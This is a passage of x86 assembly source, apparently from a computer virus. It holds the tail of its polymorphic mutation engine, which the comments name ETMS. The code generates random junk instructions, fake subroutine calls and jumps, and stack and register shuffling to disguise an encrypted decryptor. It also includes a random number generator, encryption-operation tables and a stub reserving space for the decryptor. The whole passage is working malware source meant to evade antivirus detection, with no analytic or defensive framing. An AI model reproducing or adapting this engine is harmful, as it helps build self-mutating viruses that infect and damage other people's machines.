no_offsetadd:
        cmp     byte ptr [esi],20h
        jne     no_key_needed

        mov     eax,dword ptr [esi - (offset r_regkey - offset v_initkey)]
        or      cl,cl
        je      byte_key
        cmp     cl,4
        je      byte_key
        or      dl,dl
        je      byte_key

        stosb
        call    put_encloop_1

        shr     eax,8
        dec     dl
        jz      byte_key
        stosw
        call    put_encloop_2
        shr     eax,10h
byte_key:
        stosb
        call    put_encloop_1

no_key_needed:
        ret

rnd_garbage:
        push    ecx
        push    eax
        call    get_random
        and     eax,0fh         ; max - 1
        inc     eax             ; not zero
        xchg    eax,ecx

garbager:
; ecx how many
        push    edx
        push    ebx
garbager_loop:
        push    ecx
get_op_type:
        call    get_random      ; how many possible types
        and     eax,0fh

        mov     ecx,[(eax*4)+offset garbage_offsets+ebp]
        add     ecx,ebp
        call    ecx                     ; call garbage routine
        pop     ecx
        loop    garbager_loop

        mov     eax,dword ptr [t_pushed+ebp]

        cmp     eax,000005h     ; if not in a call, not in a jump and
        ja      stack_is_ok     ; pushed <=5

        or      eax,eax
        jz      stack_is_ok

        inc     byte ptr [t_inacall+ebp]

        cmp     al,01h
        ja      direct_addesp
        call    do_pop_nocheck
        jmp     stack_is_ok

direct_addesp:
        push    eax             ; then correct stack
        mov     ax,0c483h       ; add esp,nr_dd * 4
        stosw
        pop     eax
        call    force_popall
stack_is_ok:
        pop     ebx
        pop     edx

        pop     eax
        pop     ecx
        ret


do_push:
        cmp     byte ptr [t_pushed+ebp],05h     ; max dwords on the stack
        ja      exit_pusher
        inc     byte ptr [t_pushed+ebp]
        call    get_random              ; 4 types of pushing
        and     al,011b
        jz      push_register           ; normal push reg
        dec     al
        jz      push_immediate_dd       ; push immediate double
        dec     al
        jz      push_immediate_by       ; push immediate byte

        mov     ax,35ffh                ; push immediate from memory
        stosw
        call    get_address
        jmp     pre_exit_dd

push_immediate_by:
        mov     al,6ah
        stosb
        call    get_random
        shr     al,1
        jc      zero_or_menouno
        call    get_random              ; normal push as byte
        jmp     pre_exit_pusher

zero_or_menouno:                        ; very usual pushes
        and     al,01b                  ; so we will get 0 or -1
        dec     al                      ; to LARGE 0 or to LARGE -1
        jmp     pre_exit_pusher

push_immediate_dd:
        mov     al,68h
        stosb
        call    get_random
pre_exit_dd:
        stosd                           ; normal push as double
        jmp     exit_pusher

push_register:
        call    get_random_al7
        add     al,050h
pre_exit_pusher:
        stosb
exit_pusher:
        jmp     exit_ppc

do_pop:
        cmp     byte ptr [t_pushed+ebp],00h
        je      return_nopop
do_pop_nocheck:
        call    get_random
        shr     al,1
        jnc     popintoreg2
        mov     ax,0c483h       ; add esp,
        stosw
get_number:
        call    get_random_al7
        jz      get_number
        cmp     al,byte ptr [t_pushed+ebp]
        ja      get_number
force_popall:
        sub     byte ptr [t_pushed+ebp],al
        shl     al,2            ; dd are pushed, so * 4
        jmp     store_ngo2
popintoreg2:
        call    get_register
        add     cl,058h         ; pop in a register
        xchg    eax,ecx
        dec     byte ptr [t_pushed+ebp]
store_ngo2:
        stosb
return_nopop:
        jmp     exit_ppc

call_subroutines:
        cmp     word ptr [t_maxjmps+ebp],0h      ; don't nest too much nor
        jne     just_exit_call                   ; put pushes/pops in subs and
                                                 ; we can't know wassup in
                                                 ; conditional jumps and such

        inc     byte ptr [t_inacall+ebp]

        call    get_random_al7
        cmp     al,01h          ; 00h and 01h push
        jbe     do_push
        cmp     al,05           ; 02h - 05h pops (more probable so final stack
        jbe     do_pop          ; correction should be needed less often)

        ; 06,07 do a call
        mov     al,0e8h
        stosb
        stosd           ; place for offset

        push    edi
        call    rnd_garbage
        pop     ebx

        mov     al,0e9h
        stosb
        stosd                   ; jump offset
        push    edi
        call    rnd_garbage

        push    ebx
        neg     ebx
        add     ebx,edi
        xchg    eax,ebx
        pop     ebx

        mov     dword ptr [ebx-4],eax   ; call offset

        call    rnd_garbage    ; this is the called "subroutine"

        call    get_random      ; more ways of getting back from subroutine,
        shr     al,1            ; either with normal ret or by correcting the
        jnc     normal_ret      ; stack by popping or by adding to esp
        shr     al,1
        jnc     popintoreg
        mov     ax,0c483h       ; add esp,
        stosw
        mov     al,4
        jmp     store_ngo
popintoreg:
        call    get_register
        add     cl,058h         ; pop base
        xchg    eax,ecx
        jmp     store_ngo
normal_ret:
        mov     al,0c3h         ; ret
        stosb
        call    get_random_al7
        cmp     al,3
        ja      no_ccs
        xchg    eax,ecx
        mov     al,0cch         ; int3, usual after subroutines in win32s
        rep     stosb
store_ngo:
        stosb
no_ccs:
        call    rnd_garbage

        pop     ebx             ; jump offset

        push    ebx
        neg     ebx
        add     ebx,edi
        xchg    eax,ebx
        pop     ebx

        mov     dword ptr [ebx-4],eax
exit_ppc:
        dec     byte ptr [t_inacall+ebp]
just_exit_call:
        ret

maths_immediate_short:
        stc
        jmp     maths_immediate_1

maths_immediate:
        clc
maths_immediate_1:
        pushf
        call    get_random_al7 ; 0 to 7
        shl     al,3           ; * 8
        add     al,0c0h        ; the base
        popf
        push    eax
        pushf
        call    get_register
        add     al,cl
        mov     ah,81h          ; prefix
        popf
        pushf
        jnc     not_a_shortone
        inc     ah
        inc     ah
not_a_shortone:
        xchg    ah,al
        stosw
        call    g_dimension
        popf
        jnc     not_a_shortone2
        mov     cl,01h
not_a_shortone2:
        call    put_immediates
        pop     eax
        cmp     al,0f8h         ; is a CMP
        jne     not_compare
make_jmp_after_cmp:
        call    get_random
        and     eax,01b         ; long or short jump
        add     al,06h          ; short jump
        jmp     make_jump
not_compare:
        ret

cdq_jmps_savestack:
        call    get_random_al7
        sub     al,3
        jc      exit_c_j_ss
        xchg    eax,ecx
        mov     al,byte ptr [ecx+offset change_jump+ebp]
        cmp     cl,1
        ja      not_cdq_cbw

        test    byte ptr [r_used+ebp],0101b ; EAX and EDX for cbw,cwd,cdq,cwde
        jnz     exit_c_j_ss
        stosb
        inc     edi
        call    g_dimension
        dec     edi
        jmp     exit_c_j_ss
not_cdq_cbw:
        cmp     cl,4
        je      pushandmov
        add     cl,4                    ; this is used for dimension
        jmp     do_that_fjump           ; do as for conditional ones
pushandmov:

        call    select_save
        jc      exit_c_j_ss

        xchg    eax,ebx
        mov     al,50h                  ; push

        xor     ch,ch                   ; so it won't be erased from stack
        xchg    ch,byte ptr [t_pushed+ebp]

        push    ecx
        call    unset_used              ; mark that as unused one
        add     al,bl                   ; push the reg
        stosb
        call    rnd_garbage
        add     al,08h          ; pop opcode
        stosb

        pop     ebx
        mov     byte ptr [t_pushed+ebp],bh
        mov     byte ptr [r_used+ebp],bl
exit_c_j_ss:
        ret


gen_one_byters:
        call    get_random_al7
make_jump:
        mov     cl,al
        mov     al,byte ptr [eax+offset one_byters+ebp]   ; get onebyter
        cmp     cl,05h
        jbe     not_jump
do_that_fjump:
        cmp     byte ptr [t_maxjmps+ebp],3        ; don't nest too much
        je      just_exit
        inc     byte ptr [t_maxjmps+ebp]

        cmp     al,0e9h                 ; for unconditional ones skip some
        jae     skip_unc                ; things

        cmp     cl,07h
        jne     not_longjump
        push    eax
        mov     al,0fh                  ; long prefix
        stosb
        pop     eax
not_longjump:
        push    eax
        call    get_random
        and     al,0fh
        mov     ch,al
        pop     eax
        add     al,ch
skip_unc:
        stosb                           ; type of jump
        stosb                   ; first off
        cmp     cl,07h
        jne     not_longone
        dec     edi
        stosd
not_longone:
        push    edi
        call    rnd_garbage
        pop     ebx
        mov     eax,edi
        sub     eax,ebx                 ; offset of jump
        dec     byte ptr [t_maxjmps+ebp]
        cmp     cl,7
        je      long_jumper
        cmp     eax,7fh                 ; if not too big then use it
        jb      good_jump
        mov     edi,ebx                 ; else forget everything
        dec     edi
        dec     edi
        ret
good_jump:
        mov     byte ptr [ebx-1],al
        ret
long_jumper:
        mov     dword ptr [ebx-4],eax
        ret
not_jump:
        stosb
just_exit:
        ret

mem_assign:
        mov     ax,058bh
        jmp     mem_common

mem_mathops:
        call    get_random_al7  ; 0 to 7
        shl     al,3
        add     al,03h          ; base
mem_common:
        push    eax
        call    get_register
        shl     cl,3            ; *8
        add     cl,05h          ; base for eax
        mov     ah,cl
        stosw
        call    g_dimension

; now offset
        call    get_address
        stosd
        pop     eax
        cmp     al,3bh                  ; is a cmp
        je      make_jmp_after_cmp      ; if so force a compare
        ret


mov_registers:
        call    get_random_al7          ; random source
        add     al,0c0h
        mov     ah,08bh
        call    get_register            ; useful dest
        shl     cl,3
        add     al,cl
        xchg    ah,al
        stosw
        jmp     g_dimension

maths_registers:
        call    get_random_al7
        shl     al,3
        add     al,03h         ; base
        mov     ah,0c0h         ; suff
        push    eax

        call    get_register    ; dest
        shl     cl,03h
        add     ah,cl

        xchg    eax,ecx             ; save temp in ecx
        call    get_random_al7      ; all regs
        xchg    eax,ecx             ; reg in ECX and restore EAX

        add     ah,cl
        stosw

        call    g_dimension
        pop     eax
        cmp     al,3bh
        je      make_jmp_after_cmp
        ret

rotating_imms:
        call    get_random_al7
        cmp     al,0110b                ; 0f0 doesn't exist
        je      rotating_imms
        shl     al,3                    ; *8
        add     al,0c0h

        call    get_register
        add     al,cl
        mov     ah,0c1h
        xchg    al,ah
        stosw
        call    g_dimension
        xor     ecx,ecx
        inc     cl
        jmp     put_immediates

notneg_register:
        call    get_random
        shr     al,1
        mov     ax,0d0f7h
        jc      not_add
        add     ah,08h
not_add:
        call    get_register
        add     ah,cl
        stosw
;        jmp     g_dimension

g_dimension:
; EDI after generated garb
reget_dim:
        call    get_random
        and     eax,010b        ; 0 or 2
        jnz     no_change
word_change:
        mov     ecx,dword ptr [edi-2]
        mov     byte ptr [edi-2],66h    ; the prefix
        mov     dword ptr [edi-1],ecx
        inc     edi
no_change:
        inc     eax
        inc     eax
        xchg    eax,ecx                 ; in ECX needed immediates
        ret

imm_assign:
        call    get_register
        mov     al,0b8h         ; base
        add     al,cl
        stosb
        inc     edi
        call    g_dimension
        dec     edi
;        jmp     put_immediates

put_immediates:
; cl how many
        call    get_random
put_imm_part:
        stosb
        shr     eax,8
        loop    put_imm_part
        ret

inc_dec_reg:
        call    get_random
        and     al,01b
        shl     al,3                    ; * 8, so will be 0 or 8
        add     al,40h                  ; incdec generation
        call    get_register
        add     al,cl
        stosb
        inc     edi
        call    g_dimension
        dec     edi
        ret

xchg_regs:
        mov     ax,0c087h               ; xchg eax,eax
        call    get_register
        add     ah,cl
        call    get_register
common_test_xchg:
        shl     cl,3
        add     ah,cl
        stosw
        jmp     g_dimension

test_regs:
        mov     ax,0c085h               ; test eax,eax
        push    eax
        call    get_random_al7
        mov     ch,al
        call    get_random_al7
        mov     cl,al
        pop     eax
        add     ah,ch
        jmp     common_test_xchg

temp_save_change:
        call    get_random_al7
        sub     al,6                    ; 1/4 probability, since this couldn't
        jc      skip_changer            ; come too often

        call    select_save
        jc      skip_changer

        push    ecx
        call    save_mov_xchg

        xchg    eax,ecx                 ; in al new register
        mov     al,byte ptr [edx]       ; imp_reg
        shl     al,3
        xchg    eax,ecx
        add     al,cl
        or      al,0c0h
        xchg    al,ah
        stosw                           ; mov important_reg,some_reg
        pop     ebx
        mov     byte ptr [r_used+ebp],bl    ; restore regs status
skip_changer:
        ret

select_save:
        call    get_random_al7
        sub     al,5                    ; get from 0 to 2
        jc      select_save

        xchg    eax,edx
        add     edx,offset r_pointer
        add     edx,ebp
        mov     al,byte ptr [edx]

        cmp     al,0ffh                 ; not already assigned?
        je      exit_bad

        cmp     al,20h                  ; no key signature, if so skip
        je      exit_bad

        call    is_used                 ; maybe is already saved on stack or
        jnz     return_good             ; such?
exit_bad:
        stc
        ret
return_good:
        mov     cl,byte ptr [r_used+ebp]
        clc
        ret

save_mov_xchg:
        xchg    eax,ebx
        call    get_register            ; get an usable register
        xchg    eax,ecx
        call    set_used                ; set this one as used
        call    unset_used              ; and the previous as unused
        mov     ah,087h                 ; xchg reg,reg base
        push    eax
        xor     ecx,ecx
        call    get_random              ; select if using mov or xchg
        shr     al,1
        jc      use_mov_first
        mov     cl,4                    ; + 4 becames mov reg,reg base
use_mov_first:
        shr     al,1                    ; when just saving this won't be used
        jc      use_mov_after           ; select whichone for restore aswell
        mov     ch,4
use_mov_after:
        pop     eax
        add     ah,ch                   ; restore one
        push    eax
        sub     ah,ch
        add     ah,cl
        shl     al,3                    ; * 8
        add     al,bl
        or      al,0c0h                 ; mov some_reg,important_reg
        xchg    al,ah
        stosw                           ; put the moving of regs
        call    rnd_garbage
        pop     eax
        ret


; tables for various purposes
garbage_offsets:
        dd      offset  call_subroutines
        dd      offset  gen_one_byters
        dd      offset  mov_registers
        dd      offset  mem_assign
        dd      offset  mem_mathops
        dd      offset  maths_immediate
        dd      offset  maths_immediate_short
        dd      offset  maths_registers
        dd      offset  rotating_imms
        dd      offset  notneg_register
        dd      offset  imm_assign
        dd      offset  inc_dec_reg
        dd      offset  xchg_regs
        dd      offset  test_regs
        dd      offset  temp_save_change
        dd      offset  cdq_jmps_savestack


one_byters      db      090h,0fch,0fdh,0f8h,0f9h,0f5h,070h,080h

change_jump     db      098h,099h,0ebh,0e9h

_math_imm:
        dw      008c1h  ; ror d[ebx],imm
        dw      02881h  ; sub d[ebx],imm
        dw      03081h  ; xor d[ebx],imm
        dw      00081h  ; add d[ebx],imm
        dw      000c1h  ; rol d[ebx],imm
_math_key:
        dw      008d3h  ; ror d[ebx],cl
        dw      00029h  ; sub d[ebx],eax
        dw      00031h  ; xor d[ebx],eax
        dw      00001h  ; add d[ebx],eax
        dw      000d3h  ; rol d[ebx],cl

; cmp,or,xor,sub,add
chk_counter     db      0f8h,0c8h
key_changers    db      0e8h,0f0h,0c0h  ; xor sub add
                db      0c0h,0c8h       ; ror rol
                db      040h,048h       ; inc dec

get_address:
        push    esi
        mov     ebx,edi
        lea     esi,[offset v_runnin + ebp]
        sub     ebx,dword ptr [esi - (offset v_runnin - offset t_inipnt)]
                                                ; actual decryptor lenght
        add     ebx,dword ptr [esi - (offset v_runnin - offset v_lenght)]

        mov     edx,dword ptr [esi]

                db      0b1h            ; mov cl,
t_memand        db      00h             ; significant bytes present

        add     edx,ebx

search_offset2:
        call    get_random
        shl     eax,cl
        shr     eax,cl
        cmp     eax,dword ptr [esi]     ; is < starting off of poly?
        jb      search_offset2
look_foroff2:
        cmp     eax,edx                 ; upper border
        jbe     ok_offset2
        sub     eax,ebx
        jmp     look_foroff2
ok_offset2:
        pop     esi
        ret

get_random_al7:
        call    get_random
        and     eax,0111b
        ret

get_random:
        push    ebx
        push    edx

        db     0b8h                     ; mov eax,
seed    dd     000h                     ; random seed, must be < im

        mov     ebx,4096d                ; ia
        mul     ebx
        add     eax,150889d              ; ic
        adc     edx,0
        mov     ebx,714025d              ; im
        push    ebx
        div     ebx
        mov     dword ptr [seed+ebp],edx
        xchg    eax,edx
        cdq
        xor     ebx,ebx
        dec     ebx
        mul     ebx                     ; * 2^32 - 1
        pop     ebx
        div     ebx                     ; here we have a 0<=rnd<=2^32
        pop     edx
        pop     ebx
        ret


is_used:
; AL register
        push    eax
        mov     cl,al
        mov     al,1
        shl     al,cl
        test    byte ptr [r_used+ebp],al
        pop     eax
; Z  = register not used
; NZ = register used
        ret

set_used:
; AL register
        push    eax
        mov     cl,al
        mov     al,1
        shl     al,cl
        or      byte ptr [r_used+ebp],al
        pop     eax
        ret

unset_used:
; BL register
        push    eax
        mov     cl,bl
        mov     al,1
        shl     al,cl
        not     al
        and     byte ptr [r_used+ebp],al
        pop     eax
        ret

get_register:
        push    eax
reget_reg:
        call    get_random_al7
        call    is_used
        jnz     reget_reg               ; check we aren't using it
; the is_used will put the reg in cl
        pop     eax
        ret

; how much memory does the ETMS need, so you can substract from the lenght
; of the virus on file of course
_mem_space      =       (offset _mem_data_end - offset _mem_data_start)

_mem_data_start:

t_inipnt        dd      00h             ; initial EDI

r_pointer       db      00h             ; register used as pointer
r_counter       db      00h             ; register used as counter
r_regkey        db      00h             ; register used as key, 20h use
                                        ; immediate as key
r_used          db      00000000b
;  bits meaning          0 0 0 1 0 0 0 0
;                        E E E E E E E E
;                        D S B S B D C A
;                        I I P P X X X X

t_chgpnt        db      00h             ; changes to be made to pointer
t_chgcnt        db      00h             ; changes to be made to counter
t_chgkey        db      00h             ; changes to be made to key register
t_chgmat        db      00h             ; changes to be made to operation

t_pntoff        dd      00h             ; offset added to pointer (00h if not
                                        ; added)
t_cntoff        dd      00h             ; constant to be added to counter
                                        ; value

t_fromend       db      00h             ; 00h from start, else from end
t_countback     db      00h             ; 00h decrementing, else incrementing
t_pushed        db      00h             ; pushed dwords
t_maxjmps       db      00h             ; max jumps
t_inacall       db      00h             ; into a call or not
                db      00h             ; just to optimize poly size :)

v_lenght        dd      00h             ; lenght
v_virusp        dd      00h             ; pointer to body
v_runnin        dd      00h             ; offset at which dec will run

w_counter       dd      00h             ; where counter is assigned - 1
w_pointer       dd      00h             ; where pointer is assigned - 1
w_loopbg        dd      00h             ; where loop begins
w_encrypt       dd      00h             ; pointer on current pos in encryptor

_mem_data_end:


virus_end	equ	$
	
.code 

_main:
	Decryptor	db	1024	dup(90h)
	jmp	x_main
	
	
	FILE_ATTRIBUTE_NORMAL		equ	00000080h
	OPEN_EXISTING			equ	3
	GENERIC_READ			equ	80000000h
	GENERIC_WRITE			equ	40000000h
	INVALID_HANDLE_VALUE		equ	-1
	PAGE_READWRITE			equ	4h
	FILE_MAP_WRITE			equ	00000002h	
	FILE_SHARE_READ			equ	00000001h	
	GPTR				equ	0040h
	OPEN_ALWAYS			equ	4
	
end _main